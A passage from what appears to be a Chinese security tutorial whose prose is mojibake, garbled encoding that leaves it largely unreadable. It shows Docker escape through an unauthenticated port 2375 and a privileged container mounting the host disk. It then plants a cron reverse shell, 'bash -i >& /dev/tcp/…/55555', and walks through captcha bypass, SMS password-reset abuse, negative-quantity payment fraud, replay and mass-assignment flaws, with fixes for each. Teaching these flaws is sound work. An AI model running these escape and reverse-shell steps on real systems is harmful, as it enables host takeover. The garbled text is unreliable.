æœ‰è¿œç¨‹è¿æ¥å‘½ä»¤ï¼Œç”±äº2375ç«¯å£æš´éœ²ï¼Œå¯æœªæˆæƒè®¿é—®ï¼Œæ‰€ä»¥ç°åœ¨å¯ä»¥åœ¨kaliä¸Šé€šè¿‡è¿œç¨‹æ–¹å¼è¿æ¥doker å‰é¢çš„æ“ä½œéƒ½ä¸€è‡´ å”¯ä¸€ä¸åŒçš„å°±æ˜¯å†™çš„å‘½ä»¤å’Œè·¯å¾„ æœ‰å¾ˆå¤šç§å†™è®¡åˆ’ä»»åŠ¡çš„æ–¹æ³• docker -H tcp://192.168.4.92:2375 ps docker -H tcp://192.168.4.92:2375 images é“¾æ¥è¿›å»ä¹‹åï¼Œå‘ç°æ²¡æœ‰é•œåƒæ–‡ä»¶ï¼Œé‚£ä¹ˆå»å®˜æ–¹ä¸‹è½½ä¸€ä¸ªé•œåƒæ–‡ä»¶busybox docker -H tcp://192.168.241.142:2375 pull busybox æ¥ä¸‹æ¥å¯åŠ¨å®¹å™¨ï¼Œå¹¶è¿›å…¥ busybox å®¹å™¨ docker -H tcp://192.168.4.92:2375 images docker -H tcp://192.168.4.92:2375 run -it --privileged busybox bin/sh #åœ¨kaliä¸­å¯åŠ¨ä¸€ä¸ªæœ‰äº¤äº’çš„shellï¼Œå¹¶ä¸”æ˜¯ç‰¹æƒé•œåƒ #å½“æ“ä½œè€…æ‰§è¡Œdocker run â€”privilegedæ—¶ï¼ŒDockerå°†å…è®¸å®¹å™¨è®¿é—®å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼ŒåŒæ—¶ä¿®æ”¹AppArmoræˆ–SELinuxçš„é…ç½®ï¼Œä½¿å®¹å™¨æ‹¥æœ‰ä¸é‚£äº›ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹å‡ ä¹ç›¸åŒçš„è®¿é—®æƒé™ã€‚ è¿›å…¥å®¹å™¨åï¼Œä½¿ç”¨fdisk -lå‘½ä»¤æŸ¥çœ‹ç£ç›˜æ–‡ä»¶ æ³¨æ„ï¼šåœ¨ç‰¹æƒæ¨¡å¼ä¸‹ï¼Œé€ƒé€¸çš„æ–¹å¼å¾ˆå¤šï¼Œæ¯”å¦‚ï¼šç›´æ¥åœ¨å®¹å™¨å†…éƒ¨æŒ‚è½½å®¿ä¸»æœºç£ç›˜ï¼Œç„¶ååˆ‡æ¢æ ¹ç›®å½•ã€‚ ä»è¿”å›çš„typeä¿¡æ¯ä¸­å¯ä»¥åˆ¤æ–­å‡ºï¼Œ/dev/sda2æ˜¯ä¸»åˆ†åŒºï¼Œé‚£ä¹ˆæ¥ä¸‹é‡Œç›´æ¥åœ¨å®¹å™¨å†…éƒ¨æŒ‚è½½å®¿ä¸»æœºç£ç›˜ æ–°å»ºä¸€ä¸ªç›®å½•ï¼šmkdir wxiaoge æŒ‚è½½ç£ç›˜åˆ°æ–°å»ºç›®å½•ï¼šmount dev/sda2 wxiaoge è¿›å…¥ç›®å½•ï¼šcd wxiaoge/ æ–°å»ºæ–‡ä»¶ï¼štouch wxiaoge.txt æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹é¶æœºä¸­ç¡®å®åˆ›å»ºäº† wxiaoge.txt æ–‡ä»¶ï¼Œdockeré€ƒé€¸æˆåŠŸ æ¥ä¸‹æ¥å¯ä»¥åå¼¹ä¸»æœºshell åˆ›å»º wxiao.sh æ–‡ä»¶ vi wxiaoge.sh å†™å…¥åå¼¹ shell #!/bin/bash #PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin bash -c \"bash -i &gt;&amp;/dev/tcp/192.168.4.92/55555 0&gt;&amp;1\" ä¹‹åç»™ wxiao.sh æ·»åŠ æ‰§è¡Œæƒé™ï¼Œå¹¶ä¸”å†™å…¥åˆ°å®šæ—¶ä»»åŠ¡ä¸­ chmod +x wxiao.sh echo '*/1 * * * * /wxiao.sh' &gt;&gt; /wxiaoge/var/spool/cron/root #æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡wxiaoge.sh æ–‡ä»¶ kaliæ‰“å¼€ç›‘å¬ç«¯å£ ä¸€åˆ†é’ŸåæˆåŠŸè¿”å› shell å‚è€ƒæ–‡ç« ï¼šhttps://www.modb.pro/db/152994 æ¼æ´ä¿®å¤ï¼š 1.å…³é—­2375ç«¯å£ ï¼ˆå°¤å…¶æ˜¯å…¬ç½‘æƒ…å†µä¸‹ä¸€å®šè¦ç¦ç”¨æ­¤ç«¯å£ï¼‰ 2.åœ¨é˜²ç«å¢™ä¸Šé…ç½®ç¦æ­¢å¤–ç½‘è®¿é—®2375ç«¯å£ 2.5 å›¾å½¢éªŒè¯ç æ¼æ´ 1. å›¾å½¢éªŒè¯ç çªç ´ æ¼æ´ä»‹ç»ï¼šæ”»å‡»è€…é€šè¿‡çªç ´å›¾å½¢éªŒè¯ç çš„éªŒè¯ï¼Œå¯ä»¥å®ç°å¦‚ç™»å½•çˆ†ç ´ã€éªŒè¯ç ç»•è¿‡ç­‰æ”»å‡» æ¼æ´åŸç†ï¼š å›¾å½¢éªŒè¯ç åœ¨é”™è¯¯åæœªå¤±æ•ˆ è¿”å›éªŒè¯ç ä¿¡æ¯ åˆ†æ­¥éªŒè¯éªŒè¯ç  æ¼æ´ç‚¹ï¼šä»»ä½•å­˜åœ¨å›¾å½¢éªŒè¯ç çš„åŠŸèƒ½ä¸­ æ¼æ´ä¿®å¤ ä¸€æ—¦éªŒè¯ç ä½¿ç”¨è¿‡äº†ï¼Œå¿…é¡»è¦è¿›è¡Œåˆ é™¤ï¼Œé‡æ–°ç”ŸæˆéªŒè¯ç ï¼Œå¯ä»¥æ¢µé«˜attributeä¸­ éªŒè¯ç éœ€è¦è®¾ç½®è¶…æ—¶ï¼Œæ—¶é—´ä¸€åˆ°ç«‹å³åˆ é™¤æ—§éªŒè¯ç ï¼Œç”¨æˆ·éœ€è¦è·å–æ–°çš„éªŒè¯ç  éªŒè¯ç åªéœ€è¦è¿”å›å›¾ç‰‡ï¼Œåˆ‡å‹¿å°†ç”ŸæˆéªŒè¯ç çš„å­—ç¬¦ä¸²ä¹Ÿä¸€å¹¶è¿”å› éªŒè¯ç ä¸åº”è¯¥è¿›è¡Œåˆ†å¸ƒæ ¡éªŒï¼Œåº”è¯¥è¿åŒè¯·æ±‚æ•°æ®ä¸€èµ·å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œæ ¡éªŒï¼ŒæœåŠ¡å™¨æ ¡éªŒé€šè¿‡åˆ™è¿”å›åˆæ³•æ•°æ®ï¼Œå¦åˆ™è¿”å›é”™è¯¯ pikachu-on server æµ‹è¯•ç»“æœï¼šéªŒè¯ç æœ‰éªŒè¯ã€æ— å›æ˜¾ï¼Œä½†å­˜åœ¨éªŒè¯ç å›ºå®šï¼ˆå¯é‡å¤ä½¿ç”¨ï¼‰çš„è®¾è®¡ç¼ºé™·ã€‚ ä»¥ä¸‹ä¸ºéªŒè¯ç å›ºå®šé—®é¢˜æµ‹è¯•è¿‡ç¨‹å’Œæºç åˆ†æã€‚ æµ‹è¯•è¿‡ç¨‹ è¾“å…¥ä¸æ­£ç¡®çš„è´¦æˆ·/å¯†ç åŠæ­£ç¡®çš„éªŒè¯ç æµ‹è¯• é‡å¤æäº¤è¯¥æ•°æ®åŒ…å‡åªè¿”å›ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œè¯´æ˜å­˜åœ¨éªŒè¯ç å›ºå®šæ¼æ´ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯åˆ©ç”¨æ­¤æ¼æ´ç»•è¿‡éªŒè¯ç ç›´æ¥å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ æºç åˆ†æ æ–‡ä»¶ï¼š\\vul\\burteforce\\bf_server.php å…³é”®ä»£ç ï¼š åœ¨ç”¨æˆ·åã€å¯†ç å’ŒéªŒè¯ç å‡ä¸ä¸ºç©ºçš„æƒ…å†µä¸‹åˆ¤æ–­è¾“å…¥éªŒè¯ç æ˜¯å¦ä¸ç”Ÿæˆåä¿å­˜åœ¨sessionä¸­çš„éªŒè¯ç ç›¸åŒï¼Œä½†æ¯”è¾ƒå®Œåæ²¡æœ‰åˆ é™¤è¯¥session[vcode],å¯¼è‡´ä¸‹ä¸€ä¸ªæ•°æ®åŒ…è¾“å…¥è¯¥éªŒè¯ç ä¹Ÿä¼šåˆ¤æ–­æ­£ç¡®ï¼Œå‡ºç°éªŒè¯ç é‡å¤ä½¿ç”¨é—®é¢˜ã€‚ å‡­å€Ÿæ­¤æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹ç”¨æˆ·åä¸å¯†ç è¿›è¡Œçˆ†ç ´ï¼ŒéªŒè¯ç éšæ„å³å¯ï¼ˆä½†è¦ä¿è¯è¯¥éªŒè¯ç æ˜¯åœ¨æ ¡éªŒé¡µé¢å‡ºç°è¿‡çš„éªŒè¯ç ï¼‰ pikachu-on client æµ‹è¯•è¿‡ç¨‹ é€šè¿‡æŸ¥çœ‹æºç å‘ç°å‰ç«¯JSåˆ¤æ–­éªŒè¯ç æ˜¯å¦æ­£ç¡®ï¼Œæ‰€ä»¥å…ˆè¾“å…¥æ­£ç¡®çš„éªŒè¯ç ç»•è¿‡å‰ç«¯åˆ¤æ–­ã€‚ è¾“å…¥ä¸æ­£ç¡®çš„è´¦æˆ·/å¯†ç åŠéªŒè¯ç è¿›è¡ŒæŠ“åŒ…æµ‹è¯•ã€‚ ç”±äºå·²ç»ç»•è¿‡å‰ç«¯jså¯¹éªŒè¯ç çš„åˆ¤æ–­ï¼Œå¯ä»¥å°†è¯·æ±‚åŒ…ä¸­çš„éªŒè¯ç å‚æ•°åˆ é™¤ã€‚ï¼ˆå¯ä»¥åˆ é™¤vcodeå‚æ•°ï¼‰ å†å°†æ•°æ®åŒ…å‘é€åˆ°intruderå¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæš´åŠ›ç ´è§£å³å¯ã€‚ æºç åˆ†æ å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿›è¡Œçš„å‰ç«¯jsæ ¡éªŒ æ›´å¤šå‚è€ƒï¼šhttps://xz.aliyun.com/t/6971#toc-20 2.6 æ‰¾å›å¯†ç é€»è¾‘æ¼æ´ 1. å¯†ç æ‰¾å›æ¼æ´ æ¼æ´ä»‹ç»ï¼šæ”»å‡»è€…é€šè¿‡å¯†ç æ‰¾å›é€»è¾‘æ¼æ´ï¼Œå¯ä»¥é‡ç½®ä»–äººè´¦å·å¯†ç ï¼Œå±å®³ä»–äººè´¦å·å®‰å…¨ æ¼æ´åŸç†ï¼šå…¶å®æ˜¯éªŒè¯ç æ¼æ´çš„ä¸€ç§ï¼š éªŒè¯ç æ—¶é—´é•¿å¯çˆ†ç ´ è¿”å›é‡ç½®å¯†ç å‡­è¯ è‹¥åŠ å¯†çš„é‡ç½®å¯†ç å‡­è¯ æ¼æ´ç‚¹ï¼šä»»ä½•å¯†ç æ‰¾å›å¤„ï¼ˆå¯å»¶ä¼¸è‡³ç›¸ä¼¼å…·æœ‰éªŒè¯åŠŸèƒ½ï¼‰ ä¿®æ”¹æ¥å—æ ¡éªŒç ç›®æ ‡ æ¼æ´ä¿®å¤ ä¸€æ—¦éªŒè¯ç ä½¿ç”¨è¿‡äº†ï¼Œå¿…é¡»è¦è¿›è¡Œåˆ é™¤ï¼Œé‡æ–°ç”ŸæˆéªŒè¯ç ï¼Œå¯ä»¥æ”¾åˆ°attributeä¸­ éªŒè¯ç éœ€è¦è®¾ç½®è¶…æ—¶ï¼Œæ—¶é—´ä¸€åˆ°ç«‹å³åˆ é™¤æ—§éªŒè¯ç ï¼Œç”¨æˆ·éœ€è¦è·å–æ–°çš„éªŒè¯ç  æ ¡éªŒå‡­è¯ä¸èƒ½å¤Ÿéšç€è¿”å›åŒ…è¿›è¡Œè¿”å› éªŒè¯ç ä¸åº”è¯¥è¿›è¡Œåˆ†å¸ƒæ ¡éªŒï¼Œåº”è¯¥è¿åŒè¯·æ±‚æ•°æ®ä¸€èµ·å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œæ ¡éªŒï¼ŒæœåŠ¡å™¨æ ¡éªŒé€šè¿‡åˆ™è¿”å›åˆæ³•æ•°æ®ï¼Œå¦åˆ™è¿”å›é”™è¯¯ æ ¡éªŒå‡­è¯çš„ç”Ÿæˆéœ€è¦è¿›è¡Œéšæœºç”Ÿæˆï¼Œé˜²æ­¢å‡­è¯ç ´è§£ ç”¨æˆ·èº«ä»½å‡­è¯å’Œæƒé™ç±»æ¼æ´ä¿®å¤ä¸€æ ·ï¼Œéœ€è¦ä»attributeä¸­è·å– ç™»å½•å¯†ç é‡ç½®æ¼æ´-å¢¨è€…å­¦é™¢ é¶åœºåœ°å€ï¼šhttps://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe?spm=a2c6h.12873639.article-detail.4.6ee8b738CVQGTH æ‰“å¼€é¶åœºç•Œé¢å¦‚ä¸‹ï¼š 1ã€é€šè¿‡â€œæœé˜³ç¾¤ä¼—â€çš„ä¸¾æŠ¥ï¼Œè¯å®æ‰‹æœºå·â€œ17101304128â€åœ¨ç³»ç»Ÿå¹³å°ä»äº‹éæ³•é›†èµ„ã€è¯ˆéª—æ´»åŠ¨ã€‚ 2ã€è¯·é‡ç½®â€œ17101304128â€ç™»å½•å¯†ç ï¼Œä»¥ä¾¿ç™»å½•è·å–å®Œæ•´çš„æ•°å­—è¯æ® ç‚¹å‡»è¿›å…¥é‡ç½®å¯†ç ï¼Œæ¥åˆ°å¯†ç é‡ç½®ç•Œé¢ å·²æ³¨å†Œçš„æ‰‹æœºå·ä¸º18868345809 å…ˆè¾“å…¥æ‰‹æœºå·17101304128ï¼Œè¾“å…¥æ–°å¯†ç ï¼šå›¾å½¢éªŒè¯ç ï¼Œç‚¹å‡»è·å–çŸ­ä¿¡éªŒè¯ç  æç¤ºï¼šå·²å‘é€è‡³è¯¥æ‰‹æœºï¼ŒçŸ­ä¿¡å·²å‘é€æœ‰æ•ˆæœŸä¸º5åˆ†é’Ÿ å†è¾“å…¥æˆ‘å·²æ³¨å†Œçš„æ‰‹æœºå·18868345809ï¼Œè®¾ç½®æ–°å¯†ç ï¼ŒéªŒè¯ç ï¼Œè·å–éªŒè¯ç  å¾—åˆ°éªŒè¯ç ï¼šVxka6a æ¼æ´ç‚¹ï¼šä»–è¯´çŸ­ä¿¡å·²å‘é€è‡³è¯¥æ‰‹æœºï¼Œå¯æ˜¯è¿™æ‰‹æœºå·ä¹Ÿä¸æ˜¯æˆ‘çš„å‘€ï¼Œæˆ‘å¹¶ä¸çŸ¥é“éªŒè¯ç æ˜¯å•¥ã€‚æ­¤æ—¶å°±å¯ä»¥å¤§èƒ†çš„çŒœæƒ³ä¸€ä¸‹ï¼Œå®ƒè¿™ä¸ªç½‘ç«™çš„é€»è¾‘ä¼šä¸ä¼šå‡ºç°é—®é¢˜ï¼Œåªæ˜¯ç»Ÿä¸€éªŒè¯è¾“å…¥çš„éªŒè¯ç æ˜¯å¦æ˜¯æ­£ç¡®çš„ï¼Œè€Œæ²¡æœ‰å¯¹ç»‘å®šçš„æ‰‹æœºå·è¿›è¡Œæ ¡éªŒã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åˆšæ‰å¾—åˆ°çš„éªŒè¯ç 863bTVæ¥å°è¯•é‡ç½®ï¼ŒæˆåŠŸå¾—åˆ°keyå€¼ã€‚ ç¬¬äºŒç§åšæ³•ï¼šå…ˆç”¨è‡ªèº«çš„è´¦å·è¿›è¡Œå¯†ç é‡ç½®æµç¨‹ï¼Œåœ¨å¾—åˆ°éªŒè¯ç åï¼ŒbpæŠ“åŒ…ä¿®æ”¹æ‰‹æœºå·å‚æ•°ï¼ˆæ¢æˆç›®æ ‡æ‰‹æœºå·å³å¯ï¼‰è¿™æ ·åŒæ ·å¯ä»¥çš„åˆ°keyï¼Œä¸¤ç§æƒ³æ³•éƒ½ä¸€æ ·ï¼Œåªä¸è¿‡ç¬¬äºŒç§ä¼¼ä¹æ›´å¥½ç†è§£ 2.7 ä¸šåŠ¡æ•°æ®ç¯¡æ”¹æ¼æ´ 1. ä¸šåŠ¡æ•°æ®ç¯¡æ”¹ï¼ˆèµ‹å€¼åå†²ï¼‰ æ¼æ´ä»‹ç»ï¼šæ”»å‡»è€…é€šè¿‡è¿›è¡Œæ•°å€¼ç¯¡æ”¹è¿›è¡Œæ”»å‡»ï¼Œä»è€Œè·åˆ© æ¼æ´åŸç†ï¼š æ²¡æœ‰å¯¹ä¼ è¾“æ•°æ®æ·»åŠ ç›¸å…³çš„æ ¡éªŒå‚æ•° åå°æœªå¯¹å‚æ•°å€¼è¿›è¡Œæ ¡éªŒå¹¶ç›´æ¥ä½¿ç”¨æ•°æ®åŒ…ä¸­çš„å‚æ•° æ¼æ´ç‚¹ï¼šæŠ½å¥–ã€è´­ä¹°ã€è½¬è´¦ã€è¿”ç°ç­‰åŠŸèƒ½ æ¼æ´ä¿®å¤ï¼š å¯¹äºè½¯ä»¶æ¥è¯´ï¼Œéœ€è¦ä¿æŠ¤å¥½å†…å­˜æ•°æ®ï¼Œé˜²æ­¢å†…å­˜æ•°æ®ç¯¡æ”¹ è®¡ç®—ä¼ è¾“æ•°æ®çš„å“ˆå¸Œï¼Œå¹¶å°†å“ˆå¸Œé™„åŠ åœ¨ä¼ è¾“æ•°æ®ä¸­ä½œä¸ºæ ¡éªŒå€¼ï¼Œé¿å…è¢«ç¯¡æ”¹ å…ˆæ ¡éªŒæ•°å€¼ï¼Œé˜²æ­¢å¤§æ•´æ•°å’Œè´Ÿæ•°ï¼›æ¥ç€åˆ©ç”¨ä¼ è¾“çš„å•†å“IDä»æ•°æ®åº“ä¸­è·å–å•†å“å•ä»·é‡æ–°è¿›è¡Œä»·æ ¼è®¡ç®—ï¼›æœ€åç”Ÿæˆè®¢å•ï¼ˆè®¢å•å·åº”ä¸ºéšæœºå€¼ï¼‰ dami__cms-0å…ƒæ”¯ä»˜æ¼æ´ ç›´æ¥å°pä¸€æŠŠæ¢­ï¼Œæ³¨å†Œç™»å½•cmsçœ‹åˆ°å¦‚ä¸Šé¡µé¢ ç‚¹å‡»åœ¨çº¿å……å€¼ã€æˆ‘è¦æç°ï¼Œçœ‹åˆ°å½“å‰ä½™é¢æ˜¯0 ç‚¹å‡»äº§å“å±•ç¤ºã€å¤§ç±³æµ‹è¯•äº§å“ ç‚¹å‡»ç«‹å³è´­ä¹° å¡«å†™å®Œæ•´é€è´§åœ°å€ï¼Œå°†ä»˜æ¬¾æ–¹å¼ä¿®æ”¹ä¸ºç«™å†…æ‰£æ¬¾ ç‚¹å‡»æäº¤è®¢å•ï¼ŒåŒæ—¶ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ…æ“ä½œ å°†qtyå‚æ•°ä¿®æ”¹ä¸º-1ï¼Œç„¶åç‚¹å‡»Forwardï¼Œå¹¶å–æ¶ˆæŠ“åŒ… å¯ä»¥çœ‹åˆ°è®¢å•å·²ç»æäº¤æˆåŠŸäº† æ­¤æ—¶æŸ¥çœ‹æç°é¡µé¢çš„ä½™é¢å·²ç»å˜ä¸º6000ï¼Œä¹Ÿå°±æ˜¯å°†è®¢å•ä¸­çš„-6000ååŠ åˆ°äº†è´¦æˆ·ä½™é¢ä¸­ åˆ©ç”¨0å…ƒæ”¯ä»˜æ¼æ´ï¼Œåœ¨ç½‘ç«™å•†åŸè¿›è¡Œè´­ä¹°æ“ä½œæ—¶ï¼Œå¯æ— éœ€æ”¯ä»˜è´§å¸ï¼Œå¯¹å•†åŸé€ æˆæå¤§å±å®³ã€‚ åº”æ˜ç¡®ä¸šåŠ¡é€»è¾‘ï¼Œé˜²æ­¢å‡ºç°æ­¤æƒ…å†µ 2.8 æ‰§è¡Œé¡ºåºé€»è¾‘æ¼æ´ 1. æ‰§è¡Œé¡ºåºç¯¡æ”¹ æ¼æ´ä»‹ç»ï¼šæ”»å‡»è€…é€šè¿‡ç¯¡æ”¹åˆ†æ­¥é€»è¾‘ä¸­çš„æ­¥éª¤æ•°å­—ï¼Œè¾¾åˆ°ç»•è¿‡æ”¯ä»˜ã€æ ¡éªŒç­‰æ•ˆæœ æ¼æ´åŸç†ï¼šç¨‹åºé€»è¾‘åˆ†å¸ƒè¿›è¡Œï¼Œä½†æ˜¯å¯¹æ­¥éª¤ã€éªŒè¯ä¿¡æ¯ã€æ”¯ä»˜ä¿¡æ¯æ²¡æœ‰åšå¥½ä¸¥æ ¼æ ¡éªŒï¼Œå¯¼è‡´ä¿®æ”¹æ­¥éª¤å°±ç›´æ¥ç»•è¿‡éªŒè¯æˆ–è€…æ”¯ä»˜ æ¼æ´ç‚¹ï¼šä»»ä½•åˆ†å¸ƒé€»è¾‘ä¸”å¸¦æ­¥éª¤æ•°å­—ï¼Œæˆ–è€…åˆ©ç”¨JSè¿›è¡Œæ­¥éª¤æ§åˆ¶çš„åŠŸèƒ½ä¸­ æ¼æ´ä¿®å¤ åœ¨è¯·æ±‚æœ€åä¸€æ­¥æ—¶å€™éœ€è¦å¸¦å…¥å‰é¢çš„éªŒè¯ä¿¡æ¯ï¼ŒæœåŠ¡ç«¯å†è¿›è¡Œä¸€æ¬¡æ ¡éªŒä¿¡æ¯çš„éªŒè¯ï¼ŒéªŒè¯æ­£ç¡®æ–¹èƒ½ç»§ç»­æ‰§è¡Œæ•°æ®æ“ä½œ ä¹Ÿå¯ä»¥åŠé€šè¿‡getAttributr(â€œuseridâ€)è·å–useridè¿›è¡Œuseridå’ŒéªŒè¯ç»“æœç»‘å®šï¼Œæœ€åä¸€æ­¥ä¸å¸¦å…¥éªŒè¯ä¿¡æ¯ï¼Œä½†æ˜¯ä»ç„¶è¦è·å–useridè¿›è¡Œæ ¡éªŒ å†æœ€åä¸€æ­¥é€šè¿‡éªŒè¯ä¹‹åæˆ–è€…æœåŠ¡å™¨æ”¶åˆ°æ”¯ä»˜ä¿¡æ¯åå†ç”Ÿæˆç›¸åº”çš„æ•°æ®äº¤ç»™ç”¨æˆ· 2.9 å…¶ä»–ç±»å‹é€»è¾‘æ¼æ´ 1. æ¡ä»¶ç«äº‰æ¼æ´ æ¼æ´ä»‹ç»ï¼šå¯ä»¥é€šè¿‡åŒæ—¶é‡æ”¾å¤§é‡æ•°æ®åŒ…è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œé€šå¸¸ç”¨äºçªç ´é™é‡ã€é™é¢çš„é—®é¢˜éƒ½æœ‰å¥‡æ•ˆ æ¼æ´åŸç†ï¼šç”±äºç›®æ ‡å‡½æ•°ä¸­ï¼Œåˆ¤æ–­ä¸æ•°æ®ä¿®å¤ä¸¤ä¸ªæ­¥éª¤ä¹‹é—´ï¼Œæˆ–è€…ä¸¤ä¸ªæ•°æ®ä¿®æ”¹æ­¥éª¤ä¹‹é—´å­˜åœ¨æ—¶é—´å·®ï¼Œä¸”å‡½æ•°æœªè¿›è¡ŒåŒæ­¥é”å®šï¼Œåˆ™å¯ä»¥é€ æˆæ¼æ´ æ¼æ´ç‚¹ï¼šç¨‹åºä¸­å­˜åœ¨é™åˆ¶ï¼Œå¯ä»¥çŒœæµ‹åˆ°åå°æœ‰åˆ¤æ–­ä¸ä¿®æ”¹æ“ä½œçš„æ–¹æ³• æ¼æ´ä¿®å¤ ä¿®å¤æ€è·¯ï¼šä½¿ç”¨synchronizedå…³é”®å­—ï¼Œå¯ä»¥é™åˆ¶åŒä¸€æ—¶é—´å†…è®¿é—®æ–¹æ³•çš„åªæœ‰å•ä¸€çº¿ç¨‹ å¹¶ä¸æ˜¯æ¯ä¸ªæ¡ä»¶ç«äº‰éƒ½å¿…é¡»ä¿®å¤ 2. æ•°æ®åŒ…é‡æ”¾æ¼æ´ æ¼æ´ä»‹ç»ï¼šé€šè¿‡æ•°æ®åŒ…é‡æ”¾ï¼Œå¯ä»¥é€ æˆçŸ­ä¿¡è½°ç‚¸ã€é‚®ä»¶è½°ç‚¸ã€é‡å¤æäº¤è®¢å•ç­‰ æ¼æ´åŸç†ï¼šåå°æœªè¿›è¡Œç›¸å…³æ“ä½œçš„æŠ€æœ¯å¯¼è‡´æ•°æ®åŒ…é‡æ”¾ æ¼æ´ç‚¹ï¼šçŸ­ä¿¡éªŒè¯ç ã€é‚®ä»¶æ ¡éªŒã€æäº¤è®¢å•ç­‰åŠŸèƒ½ã€‚ ä¿®å¤æ–¹æ¡ˆï¼š ä¿®å¤æ€è·¯ï¼ˆé’ˆå¯¹çŸ­ä¿¡ã€é‚®ä»¶ï¼‰ æ„é€ ä¸€ä¸ªHashmap&lt;Stringï¼Œshort&gt;ï¼Œå­˜æ”¾é‚®ç®±æˆ–ç”µè¯å·ç åŠå¯¹åº”æ¬¡æ•° åªè¦æŸä¸ªé‚®ç®±æˆ–è€…ç”µè¯å·ç æ¬¡æ•°å¤Ÿäº†ï¼Œå°±ä¸èƒ½ç»§ç»­å‘é€äº† æˆ–è€…è®¡ç®—ä¸¤æ¬¡å‘é€çš„æ—¶é—´é—´éš”ï¼Œæ—¶é—´è¿‡çŸ­å°±ä¸ç»§ç»­å‘é€äº† é€šç”¨ä¿®å¤æ–¹æ¡ˆ éœ€è¦å»ºç«‹tokenæœºåˆ¶æˆ–éªŒè¯ç æœºåˆ¶ï¼Œä¸€æ¬¡æœ‰æ•ˆ 3. å‚æ•°ç»‘å®šæ¼æ´ æ¼æ´ä»‹ç»ï¼šé€šè¿‡æ·»åŠ å¯¹è±¡å­—æ®µç›¸å…³å‚æ•°è¿›è¡Œæ•°æ®ç¯¡æ”¹ æ¼æ´åŸç†ï¼šå¯¹è±¡è‡ªåŠ¨ç»‘å®šè¢«è®¸å¤šæ¡†æ¶æ”¯æŒï¼Œå®ƒå…è®¸å°†HTTPè¯·æ±‚å‚æ•°è‡ªåŠ¨çš„ç»‘å®šåˆ°å¯¹è±¡ï¼Œå¼€å‘è€…æ²¡æœ‰å¯¹å…¶è¿›è¡Œå®‰å…¨æ ¡éªŒåˆ™å®¹æ˜“å¯¼è‡´æ•°æ®ç¯¡æ”¹ æ¼æ´ç‚¹ï¼šå¸¸è§çš„æ‰€æœ‰è¾“å…¥çš„åœ°æ–¹éƒ½ä¼šå‡ºç°è¿™ä¸ªæ¼æ´ï¼Œç‰¹åˆ«æ˜¯é‡‘èã€ç”¨æˆ·ã€ç¼“å­˜ç­‰ã€‚ æ¼æ´ä¿®å¤ï¼šSpring MVCä¸­å¯ä»¥ä½¿ç”¨@InitBinderæ³¨é‡Šï¼Œé€šè¿‡WebDataBinderçš„æ–¹æ³•setAllowedFieldsã€setDisallowedFieldsè®¾ç½®å…è®¸æˆ–ä¸å…è®¸ç»‘å®šçš„å‚æ•° è¿™é‡Œäº†è§£ä¸€ä¸‹è¯¥æ¼æ´äº§ç”ŸåŸç†å§ è½¯ä»¶æ¡†æ¶æœ‰æ—¶å…è®¸å¼€å‘äººå‘˜è‡ªåŠ¨å°†HTTPè¯·æ±‚å‚æ•°ç»‘å®šåˆ°ç¨‹åºå˜é‡æˆ–å¯¹è±¡ä¸­ï¼Œä»¥ä½¿å¼€å‘äººå‘˜æ›´å®¹æ˜“ä½¿ç”¨è¯¥æ¡†æ¶å¼€å‘ã€‚è¿™æœ‰æ—¶ä¼šé€ æˆä¼¤å®³ã€‚æ”»å‡»è€…æœ‰æ—¶å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•æ¥åˆ›å»ºï¼Œä¿®æ”¹ï¼Œæ›´æ–°å¼€å‘äººå‘˜æˆ–è€…ä¸šåŠ¡æœ¬èº«ä»æœªæ‰“ç®—è®¾è®¡åˆ°çš„å‚æ•°ï¼Œè€Œè¿™äº›æ–°å‚æ•°åè¿‡æ¥åˆä¼šå½±å“ç¨‹åºä»£ç ä¸­ä¸éœ€è¦çš„æ–°å˜é‡æˆ–å¯¹è±¡ã€‚ å› æ­¤å°±æ‹¿Spring MVCä¸­çš„è‡ªåŠ¨ç»‘å®šä½œä¸ºä¸¾ä¾‹ï¼Œå‡è®¾æœ‰ä¸€ä¸ªç”¨æˆ·æäº¤åŸºæœ¬ä¿¡æ¯çš„åŠŸèƒ½ï¼š é¦–å…ˆçœ‹å‰ç«¯htmlï¼š &lt;form action=â€œaddUserInfoâ€ method=\"post\"&gt; &lt;input name=username type=text&gt;&lt;br&gt; &lt;input name=phone type=text&gt;&lt;br&gt; &lt;input name=email text=text&gt;&lt;br&gt; &lt;input type=submit&gt; &lt;/form&gt; å¾ˆç®€å•ï¼Œä¸€ä¸ªformè¡¨å•ï¼Œé€šè¿‡postæäº¤usernameï¼Œphoneï¼Œemailåˆ°addUserInfoã€‚ æˆ‘ä»¬çœ‹ä¸€ä¸‹ç”¨æˆ·çš„å®ä½“ç±»ï¼š public class User { private String userid; private String username; private String phone; private String email; private boolean isAdmin; //Getters &amp; Setters } å¯ä»¥çœ‹åˆ°Userçš„å®ä½“ç±»å­˜åœ¨é™¤äº†usernameï¼Œphoneï¼Œemailè¿˜æœ‰æ¯”è¾ƒé‡è¦çš„useridå’ŒisAdminå‚æ•°ã€‚ æˆ‘ä»¬æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹controllerå±‚å¦‚æœåˆ©ç”¨äº†è‡ªåŠ¨ç»‘å®šå¯ä»¥å†™å‡ºçš„å¤„ç†æ–¹å¼ï¼š @RequestMapping(value = \"/addUserInfo\", method = RequestMethod.POST) public String submit(User user) { userService.add(user); return \"successPage\"; } 